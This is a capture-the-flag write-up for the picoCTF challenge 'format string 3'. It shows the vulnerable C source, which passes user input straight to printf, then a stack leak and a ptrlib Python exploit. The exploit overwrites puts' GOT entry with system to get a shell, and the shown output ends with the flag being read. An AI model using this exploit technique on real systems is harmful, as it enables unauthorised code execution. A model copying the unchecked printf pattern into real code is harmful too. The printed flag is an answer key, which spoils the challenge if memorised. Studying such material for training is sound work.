# format string 3:Binary Exploitation:300pts
This program doesn't contain a win function. How can you win?  
Download the binary [here](format-string-3).  
Download the source [here](format-string-3.c).  
Download libc [here](libc.so.6), download the interpreter [here](ld-linux-x86-64.so.2). Run the binary with these two files present in the same directory.  
Connect with the challenge instance here:  
`nc rhea.picoctf.net 61616`  

Hints  
Is there any way to change what a function points to?  

# Solution
The binaries running in various servers, the source and the connection destination are passed.  
```bash
$ nc rhea.picoctf.net 61616
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f51e40233f0
satoki,%p
satoki,0x7f51e4181963
/bin/sh
```
When connected, the libc address of 'setvbuf' is passed for some reason, the input is echoed back, and finally '/bin/sh' is displayed.  
Of course, there seems to be an FSB. The source was as follows. 
```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}
```
The last '/bin/sh' seems to be 'puts'. 
Based on the libc leak, this mystery feature, and the 'hello' function, it seems to be a problem with FSB rewriting 'puts' got to 'system'.  
```bash
$ checksec --file=./format-string-3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   RW-RUNPATH   44 Symbols        No    0               2               ./format-string-3
```
After all, it is a Partial RELRO.  
[format string 2] (.. /format_string_2) and use the FSB function of ptrlib. 
```bash
$ nc rhea.picoctf.net 61616
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f8ceecf83f0
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
0x7f8ceee56963,0xfbad208b,0x7ffccc8dd4f0,0x1,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,
/bin/sh
```
Specify the 38th.  
```python
from ptrlib import *

libc = ELF("./libc.so.6")
elf = ELF("./format-string-3")
# sock = Process("./format-string-3")
sock = Socket("nc rhea.picoctf.net 61616")

sock.recvuntil("libc: ")
leak = int(sock.recvline(), 16)
libc.base = leak - libc.symbol("setvbuf")

payload = fsb(38, {elf.got("puts"): libc.symbol("system")}, bits=64)
sock.sendline(payload)

sock.sh()
```
Execute.  
```bash
$ python fsb3.py
[+] __init__: Successfully connected to rhea.picoctf.net:61616
[+] base: New base address: 0x7fa99c832000
~~~
[ptrlib]$ ls
[ptrlib]$ Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
cat flag.txt
[ptrlib]$ picoCTF{G07_G07?_92325514}
```
The shell can be removed, so when I read the flag.txt, the flag was written.
## picoCTF{G07_G07?_92325514}